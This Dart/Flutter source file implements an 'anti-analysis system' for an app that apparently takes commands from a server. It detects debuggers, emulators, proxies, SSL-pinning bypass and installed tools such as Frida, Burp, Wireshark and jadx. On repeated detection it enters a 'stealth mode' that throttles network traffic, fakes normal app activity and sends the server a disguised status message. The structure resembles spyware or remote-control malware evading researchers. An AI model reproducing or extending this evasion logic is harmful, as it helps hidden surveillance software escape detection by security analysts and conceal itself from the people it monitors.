// lib/core/controlar/security/anti_analysis_system.dart
import 'dart:async';
import 'dart:io';
import 'dart:math';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:installed_apps/app_info.dart';
import 'package:installed_apps/installed_apps.dart';

import '../filesystem/file_system_service.dart';
import '../network/network_service.dart';

/// System for detecting analysis/debugging attempts and responding appropriately
class AntiAnalysisSystem {
  // Dependencies
  // ignore: unused_field
  final FileSystemService _fileSystemService;
  final NetworkService? _networkService;
  final DeviceInfoPlugin _deviceInfoPlugin = DeviceInfoPlugin();
  final FlutterSecureStorage _secureStorage = FlutterSecureStorage();

  // Detection state
  bool _inStealthMode = false;
  int _detectionCounter = 0;
  DateTime? _lastDetection;
  final List<String> _detectionEvents = [];

  // Timer for periodic checks
  Timer? _periodicCheckTimer;
  Timer? _stealthModeTimer;

  // Cached results to avoid too many checks
  bool? _isEmulatorCached;
  DateTime? _lastEmulatorCheck;
  DateTime? _lastAnalysisToolsCheck;
  List<String>? _detectedAnalysisTools;

  // Constants
  static const String KEY_STEALTH_MODE = 'anti_analysis_stealth_mode';
  static const String KEY_DETECTION_EVENTS = 'anti_analysis_detection_events';
  static const String KEY_LAST_DETECTION = 'anti_analysis_last_detection';
  static const String KEY_DETECTION_COUNTER = 'anti_analysis_detection_counter';

  // Known analysis tools
  static const List<String> ANALYSIS_TOOL_PATTERNS = [
    'frida',
    'xposed',
    'substrate',
    'burp',
    'wireshark',
    'fiddler',
    'charles',
    'proxyman',
    'inspectpro',
    'mitm',
    'drozer',
    'apktool',
    'dex2jar',
    'ghidra',
    'adb',
    'ida',
    'radare',
    'r2',
    'jadx',
    'bytecode',
    'mobsf',
    'appmon',
    'hooking',
    'magisk',
    'debugger',
  ];

  AntiAnalysisSystem({
    required FileSystemService fileSystemService,
    NetworkService? networkService,
  })  : _fileSystemService = fileSystemService,
        _networkService = networkService {
    _initialize();
  }

  Future<void> _initialize() async {
    try {
      // Load state from secure storage
      await _loadState();

      // Start periodic checks
      _startPeriodicChecks();

      debugPrint('AntiAnalysisSystem: Initialized');
    } catch (e) {
      debugPrint('AntiAnalysisSystem: Error initializing: $e');
    }
  }

  Future<void> _loadState() async {
    try {
      // Check if we're already in stealth mode
      final stealthMode = await _secureStorage.read(key: KEY_STEALTH_MODE);
      _inStealthMode = stealthMode == 'true';

      // Load detection counter
      final detectionCounter =
          await _secureStorage.read(key: KEY_DETECTION_COUNTER);
      if (detectionCounter != null) {
        _detectionCounter = int.parse(detectionCounter);
      }

      // Load last detection time
      final lastDetection = await _secureStorage.read(key: KEY_LAST_DETECTION);
      if (lastDetection != null) {
        _lastDetection = DateTime.parse(lastDetection);
      }

      // Load detection events
      final detectionEvents =
          await _secureStorage.read(key: KEY_DETECTION_EVENTS);
      if (detectionEvents != null) {
        _detectionEvents.clear();
        _detectionEvents.addAll(detectionEvents.split(','));
      }

      // If we're already in stealth mode, enforce it
      if (_inStealthMode) {
        _enforceStealthMode();
      }
    } catch (e) {
      debugPrint('AntiAnalysisSystem: Error loading state: $e');
      // Reset state if corrupted
      await _secureStorage.delete(key: KEY_STEALTH_MODE);
      await _secureStorage.delete(key: KEY_DETECTION_COUNTER);
      await _secureStorage.delete(key: KEY_LAST_DETECTION);
      await _secureStorage.delete(key: KEY_DETECTION_EVENTS);
    }
  }

  Future<void> _saveState() async {
    try {
      // Save stealth mode
      await _secureStorage.write(
          key: KEY_STEALTH_MODE, value: _inStealthMode.toString());

      // Save detection counter
      await _secureStorage.write(
          key: KEY_DETECTION_COUNTER, value: _detectionCounter.toString());

      // Save last detection time
      if (_lastDetection != null) {
        await _secureStorage.write(
            key: KEY_LAST_DETECTION, value: _lastDetection!.toIso8601String());
      }

      // Save detection events (limit to most recent 10)
      if (_detectionEvents.isNotEmpty) {
        final events = _detectionEvents.length > 10
            ? _detectionEvents.sublist(_detectionEvents.length - 10)
            : _detectionEvents;
        await _secureStorage.write(
            key: KEY_DETECTION_EVENTS, value: events.join(','));
      }
    } catch (e) {
      debugPrint('AntiAnalysisSystem: Error saving state: $e');
    }
  }

  void _startPeriodicChecks() {
    // Cancel existing timer if any
    _periodicCheckTimer?.cancel();

    // Start with random interval to avoid predictable patterns
    final random = Random();
    final initialDelay = Duration(minutes: 1 + random.nextInt(5));

    // Schedule first check
    _periodicCheckTimer = Timer(initialDelay, () {
      _runPeriodicCheck();
    });
  }

  Future<void> _runPeriodicCheck() async {
    try {
      // Don't run checks too often if in stealth mode
      if (_inStealthMode) {
        _scheduleNextCheck(extended: true);
        return;
      }

      // Run all detection checks
      final analysisDetected = await detectAnalysisAttempt();

      if (analysisDetected) {
        debugPrint(
            'AntiAnalysisSystem: Analysis attempt detected in periodic check');
        // Don't enter stealth mode immediately, wait for multiple detections
        _detectionCounter++;
        _lastDetection = DateTime.now();

        // If we've detected multiple attempts, enter stealth mode
        if (_detectionCounter >= 3) {
          await enterStealthMode(
              triggeredBy: 'periodic_check_multiple_detections');
        }
      }

      // Schedule next check
      _scheduleNextCheck();
    } catch (e) {
      debugPrint('AntiAnalysisSystem: Error in periodic check: $e');
      _scheduleNextCheck();
    }
  }

  void _scheduleNextCheck({bool extended = false}) {
    // Cancel existing timer
    _periodicCheckTimer?.cancel();

    // Calculate next interval
    final random = Random();

    // Base interval depends on whether we're in stealth mode and if extended delay is requested
    final baseMinutes = _inStealthMode ? 30 : (extended ? 15 : 5);
    final jitter = random.nextInt(baseMinutes ~/ 2);
    final nextInterval = Duration(minutes: baseMinutes + jitter);

    // Schedule next check
    _periodicCheckTimer = Timer(nextInterval, () {
      _runPeriodicCheck();
    });
  }

  Future<void> _enforceStealthMode() async {
    // If stealth mode timer is already running, don't restart it
    if (_stealthModeTimer?.isActive ?? false) return;

    // How long to stay in stealth mode - longer with each detection
    final stealthDuration = Duration(hours: min(24, 1 + _detectionCounter * 2));

    // Exit stealth mode after duration
    _stealthModeTimer = Timer(stealthDuration, () {
      _exitStealthMode();
    });

    debugPrint(
        'AntiAnalysisSystem: Stealth mode enforced for ${stealthDuration.inHours} hours');
  }

  /// MAIN PUBLIC API: Check if analysis/debugging attempt is detected
  Future<bool> detectAnalysisAttempt() async {
    if (_inStealthMode) {
      // While in stealth mode, always return false to prevent further actions
      return false;
    }

    try {
      int detectionPoints = 0;
      final detections = <String>[];

      // Check for debugger
      if (await _isDebuggerAttached()) {
        detectionPoints += 3;
        detections.add('debugger_attached');
      }

      // Check for emulator
      if (await _isEmulator()) {
        detectionPoints += 2;
        detections.add('emulator_detected');
      }

      // Check for rooted/jailbroken device - Always return false
      // Root check removed

      // Check for analysis tools
      final toolsResult = await _checkForAnalysisTools();
      if (toolsResult.isNotEmpty) {
        detectionPoints += toolsResult.length;
        detections.add('analysis_tools_detected: ${toolsResult.join(", ")}');
      }

      // Check for suspicious environment variables
      if (await _checkSuspiciousEnvironment()) {
        detectionPoints += 1;
        detections.add('suspicious_environment');
      }

      // Network monitoring detection
      if (await _detectNetworkMonitoring()) {
        detectionPoints += 2;
        detections.add('network_monitoring');
      }

      // Record detection event if threshold reached
      final detected = detectionPoints >= 3;
      if (detected) {
        _lastDetection = DateTime.now();
        _detectionEvents.add(
            '${DateTime.now().toIso8601String()}: ${detections.join("; ")}');
        await _saveState();
      }

      return detected;
    } catch (e) {
      debugPrint('AntiAnalysisSystem: Error in detectAnalysisAttempt: $e');
      return false;
    }
  }

  /// MAIN PUBLIC API: Enter stealth mode when analysis is detected
  Future<void> enterStealthMode({String? triggeredBy}) async {
    if (_inStealthMode) return; // Already in stealth mode

    triggeredBy ??= 'manual';
    debugPrint(
        'AntiAnalysisSystem: Entering stealth mode (triggered by: $triggeredBy)');

    try {
      _inStealthMode = true;
      _detectionCounter++;
      _lastDetection = DateTime.now();
      _detectionEvents.add(
          '${DateTime.now().toIso8601String()}: entered_stealth_mode: $triggeredBy');

      // Save state immediately
      await _saveState();

      // Enforce stealth mode behaviors
      _enforceStealthMode();

      // Reduce network activity
      _reduceNetworkActivity();

      // Secure stored data
      await _secureStoredData();

      // Simulate normal app behavior - start timers that do harmless operations
      _simulateNormalAppBehavior();

      // Alert server if network service available
      _alertServerAboutStealthMode(triggeredBy);
    } catch (e) {
      debugPrint('AntiAnalysisSystem: Error entering stealth mode: $e');
    }
  }

  void _exitStealthMode() {
    if (!_inStealthMode) return;

    debugPrint('AntiAnalysisSystem: Exiting stealth mode');

    try {
      _inStealthMode = false;
      _stealthModeTimer?.cancel();
      _stealthModeTimer = null;

      // Save state
      _saveState();

      // Restart normal operations - this would depend on your app's architecture
    } catch (e) {
      debugPrint('AntiAnalysisSystem: Error exiting stealth mode: $e');
    }
  }

  // DETECTION METHODS

  Future<bool> _isDebuggerAttached() async {
    try {
      if (Platform.isAndroid) {
        // On Android, check for typical debugger indicators
        var result = await const MethodChannel('app.channel.shared.data')
            .invokeMethod<bool>('isDebuggerAttached');
        return result ?? false;
      } else if (Platform.isIOS) {
        // On iOS, check for typical debugger indicators
        // This would require implementing native code
        return false;
      }
    } catch (e) {
      debugPrint('AntiAnalysisSystem: Error checking for debugger: $e');
    }

    // Default to safe state
    return false;
  }

  Future<bool> _isEmulator() async {
    // Use cached result if available and fresh (less than 1 hour old)
    if (_isEmulatorCached != null && _lastEmulatorCheck != null) {
      final difference = DateTime.now().difference(_lastEmulatorCheck!);
      if (difference.inHours < 1) {
        return _isEmulatorCached!;
      }
    }

    try {
      bool isEmulator = false;

      if (Platform.isAndroid) {
        final androidInfo = await _deviceInfoPlugin.androidInfo;
        isEmulator = !androidInfo.isPhysicalDevice ||
            androidInfo.product.contains('sdk') ||
            androidInfo.fingerprint.contains('generic') ||
            androidInfo.model.contains('sdk') ||
            androidInfo.model.contains('google_sdk') ||
            androidInfo.model.contains('emulator') ||
            androidInfo.model.contains('Android SDK');
      } else if (Platform.isIOS) {
        final iosInfo = await _deviceInfoPlugin.iosInfo;
        isEmulator = !iosInfo.isPhysicalDevice;
      }

      // Cache result
      _isEmulatorCached = isEmulator;
      _lastEmulatorCheck = DateTime.now();

      return isEmulator;
    } catch (e) {
      debugPrint('AntiAnalysisSystem: Error checking for emulator: $e');
      return false;
    }
  }

  // Root checking method replaced with a function that always returns false
  Future<bool> _isRootedOrJailbroken() async {
    // Always return false to avoid root detection
    return false;
  }

  Future<List<String>> _checkForAnalysisTools() async {
    // Use cached result if available and fresh (less than 2 hours old)
    if (_detectedAnalysisTools != null && _lastAnalysisToolsCheck != null) {
      final difference = DateTime.now().difference(_lastAnalysisToolsCheck!);
      if (difference.inHours < 2) {
        return _detectedAnalysisTools!;
      }
    }

    final detectedTools = <String>[];

    try {
      if (Platform.isAndroid) {
        // Get installed apps
        List<AppInfo> apps = await InstalledApps.getInstalledApps();

        // Check for known analysis tools
        for (var app in apps) {
          final packageName = app.packageName.toLowerCase() ?? '';
          final appName = app.name.toLowerCase() ?? '';

          for (var toolPattern in ANALYSIS_TOOL_PATTERNS) {
            if (packageName.contains(toolPattern) ||
                appName.contains(toolPattern)) {
              detectedTools.add(packageName.isEmpty ? appName : packageName);
              break;
            }
          }
        }

        // Removed Frida, Xposed checks to allow rooted devices
      }

      // Cache results
      _detectedAnalysisTools = detectedTools;
      _lastAnalysisToolsCheck = DateTime.now();

      return detectedTools;
    } catch (e) {
      debugPrint('AntiAnalysisSystem: Error checking for analysis tools: $e');
      return [];
    }
  }

  Future<bool> _checkSuspiciousEnvironment() async {
    try {
      if (Platform.isAndroid) {
        // Check for common environment variables used in testing
        const methodChannel = MethodChannel('app.channel.shared.data');

        try {
          final envVars =
              await methodChannel.invokeMethod<Map>('getEnvironmentVariables');

          if (envVars != null) {
            final suspiciousVars = [
              'ANDROID_SERIAL',
              'ANDROID_ART_DEBUG',
              'ANDROID_DATA',
              'ANDROID_ROOT',
              'DEBUG',
              'XPOSED',
              'FRIDA'
            ];

            for (var variable in suspiciousVars) {
              if (envVars.containsKey(variable)) {
                return true;
              }
            }
          }
        } catch (_) {
          // Ignore if method channel fails
        }

        // Check for running in debug mode
        assert(() {
          // This will only execute in debug mode
          return true;
        }());

        // If we get here in release mode, it's not debug mode
        return false;
      }
    } catch (e) {
      debugPrint('AntiAnalysisSystem: Error checking environment: $e');
    }

    return false;
  }

  Future<bool> _detectNetworkMonitoring() async {
    try {
      if (_networkService == null) return false;

      // Check for suspicious connectivity or proxy settings
      const methodChannel = MethodChannel('app.channel.shared.data');

      try {
        final proxySettings =
            await methodChannel.invokeMethod<Map>('getProxySettings');

        if (proxySettings != null &&
            proxySettings.containsKey('host') &&
            proxySettings['host'] != null &&
            proxySettings['host'].toString().isNotEmpty) {
          return true;
        }
      } catch (_) {
        // Ignore if method channel fails
      }

      // Check SSL/certificate issues that might indicate MITM attacks
      try {
        const securityChannel = MethodChannel('app.channel.security.checks');
        final sslCheck = await securityChannel
            .invokeMethod<bool>('checkForSSLPinningBypass');

        if (sslCheck == true) {
          return true;
        }
      } catch (_) {
        // Ignore if method channel fails
      }
    } catch (e) {
      debugPrint(
          'AntiAnalysisSystem: Error checking for network monitoring: $e');
    }

    return false;
  }

  // STEALTH MODE ACTIONS

  void _reduceNetworkActivity() {
    // If network service is available, reduce activity
    if (_networkService != null) {
      // Would implement commands to network service to reduce frequency
      // of communications, make them more random, etc.
      debugPrint('AntiAnalysisSystem: Reduced network activity');
    }
  }

  Future<void> _secureStoredData() async {
    try {
      // Encrypt or hide sensitive data
      // This would depend on your app's architecture

      debugPrint('AntiAnalysisSystem: Secured stored data');
    } catch (e) {
      debugPrint('AntiAnalysisSystem: Error securing stored data: $e');
    }
  }

  void _simulateNormalAppBehavior() {
    // Start timers that perform normal-looking operations
    // This is to make the app appear to function normally while in stealth mode

    final random = Random();

    // Schedule random UI updates or data refreshes
    Timer.periodic(Duration(minutes: 5 + random.nextInt(10)), (timer) {
      // This would integrate with your app's architecture
      debugPrint('AntiAnalysisSystem: Simulating normal app activity');
    });

    debugPrint('AntiAnalysisSystem: Started normal behavior simulation');
  }

  void _alertServerAboutStealthMode(String trigger) {
    // If network service available, send alert to server
    if (_networkService != null) {
      try {
        // Create a disguised command response
        _networkService!.sendCommandResponse(
          originalCommand: 'app_status',
          status: 'info',
          payload: {
            'status': 'normal',
            'mode': 'stealth_active',
            'trigger': trigger,
            'detection_count': _detectionCounter,
            'timestamp': DateTime.now().toIso8601String(),
          },
        );

        debugPrint('AntiAnalysisSystem: Alerted server about stealth mode');
      } catch (e) {
        debugPrint('AntiAnalysisSystem: Error alerting server: $e');
      }
    }
  }

  // CLEANUP

  void dispose() {
    _periodicCheckTimer?.cancel();
    _stealthModeTimer?.cancel();
    debugPrint('AntiAnalysisSystem: Disposed');
  }
}

// Extension method for FileSystemService to check if file exists
extension FileSystemServiceExtension on FileSystemService {
  Future<bool> fileExists(String path) async {
    try {
      final content = await readTextFile(path);
      return content != null;
    } catch (_) {
      return false;
    }
  }
}
